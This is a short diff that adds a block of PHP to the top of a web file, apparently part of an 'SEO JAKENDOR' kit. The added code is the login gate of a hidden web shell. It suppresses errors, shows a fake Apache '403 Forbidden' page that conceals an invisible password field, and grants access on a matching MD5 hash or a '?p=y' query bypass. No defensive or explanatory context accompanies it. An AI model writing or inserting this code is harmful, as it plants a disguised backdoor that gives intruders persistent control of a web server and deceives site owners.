@@ -1,4 +1,9 @@
-<?php
+<?php 
+ error_reporting(0);
+ set_time_limit(0);
+ $pass = '23c86e4eb57c2e7eaf7c4ed3e4650d9c';
+ session_start(); function login(){ $server = $_SERVER['HTTP_HOST']; die("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>403 Forbidden</title> </head><body> <h1>Forbidden</h1> <p>You don't have permission to access this resource.</p> <hr> <address>Apache/2.4.41 (Ubuntu) Server at $server Port 80</address> </body></html> <style> input { margin:0;background-color:#fff;border:1px solid #fff; } </style> <pre align=center> <form method=post> <input type=password name=pass> </form></pre>"); } $disable_functions = @ini_get('disable_functions'); if(!isset($_SESSION['kucing'])) { if((md5($_POST['pass']) === $pass)||$_GET['p']==='y'){ $_SESSION['kucing'] = true; }else{ login(); }}
+?><?php
 
 $GLOBALS['JAKENDOR'] = array(
     'username' => 'SEO JAKENDOR',
